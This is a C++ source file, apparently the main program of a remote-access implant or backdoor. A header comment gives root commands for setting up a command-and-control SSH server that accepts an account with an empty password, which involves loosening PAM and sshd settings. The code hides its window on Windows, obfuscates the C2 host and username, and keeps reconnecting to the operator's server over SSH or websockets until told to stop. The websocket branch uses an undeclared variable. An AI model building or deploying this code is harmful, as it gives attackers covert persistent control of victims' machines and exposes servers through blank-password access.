/* Run all of this as root
Create a new user:
adduser --disabled-password anonymous

Disable his shell
usermod -s /bin/false anonymous

Make the password actually empty:
sed -i -re 's/^anonymous:[^:]+:/anonymous::/' /etc/passwd /etc/shadow

Allow blank passwords for SSH sessions in PAM: edit /etc/pam.d/sshd and replace the line that reads @include common-auth with:
auth [success=1 default=ignore] pam_unix.so nullok
auth requisite pam_deny.so
auth required pam_permit.so

Allow blank passwords for SSH sessions of anonymous in /etc/ssh/sshd_config:
PermitEmptyPasswords yes

Restart sshd:
systemctl restart ssh
*/

#include <thread>

#include <libssh/libssh.h>

#if CID_WEBSOCKETS
#	include <websocketswrapper.h>
#endif

#include "global.h"
#include "config.h"
#include "obfuscated_strings.h"
#include "utils.h"
#include "CidSSHClient.h"


#if !defined(IS_DEBUG) && defined(_WIN32)
//We need WinMain defined when using SUBSYSTEM:WINDOWS
#	pragma comment(linker, "/SUBSYSTEM:WINDOWS")
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    int argc = __argc;
    char** argv = __argv;
#else
int main(int argc, char** argv)
{
#endif
    char C2_SSH_host[256] = { 0 };
    char* ssh_server_port = nullptr;

#ifdef CID_C2_USER
    char C2_SSH_username[] = { OBFUSCATED(CID_C2_USER) };
#else
    char C2_SSH_username[] = { OBFUSCATED("anonymous") };
#endif // CID_C2_USER

#ifdef CID_C2_HOST // set static IP
    strncat(C2_SSH_host, OBFUSCATED(CID_C2_HOST), sizeof(C2_SSH_host) - 1);
#else
    parse_args(argc, argv, C2_SSH_host, C2_SSH_username);
#endif // C2_HOST

    
#if CID_WEBSOCKETS
    unsigned int C2_port = 4443; // default port for wss server
#else
    unsigned int C2_port = 22; // default port for SSH server
#endif
    
    int exit_flag = 0;

    ssh_init(); // libssh mandatory

    CidSSHClient client = CidSSHClient(C2_SSH_host, C2_port, C2_SSH_username);

#if CID_WEBSOCKETS
    { // WSWrapper scope
        char conn_string[500] = { NULL };
        snprintf(conn_string, sizeof(conn_string), OBFUSCATED("wss://%s:%d"), C2_host, C2_port);
        auto wswrapper = WebsocketsWrapper(conn_string);

        if (wswrapper.local_ip().length() > sizeof(C2_host))
            exit(-1);

        strncpy(C2_host, wswrapper.local_ip().c_str(), sizeof(C2_host));
        C2_port = wswrapper.local_port();

#endif
        while (1)
        {
            // client_thread connects to the C2
            std::thread client_thread(&CidSSHClient::run, &client);

            if (client_thread.joinable())
                client_thread.join();

            // Exit if the operator has asked for it
            if (client.cidSSHServer_->operatorOrderedTermination) {
                break;
            }
        }

#if CID_WEBSOCKETS
    } // WSWrapper scope
#endif

    ssh_finalize();

    return 0;
}
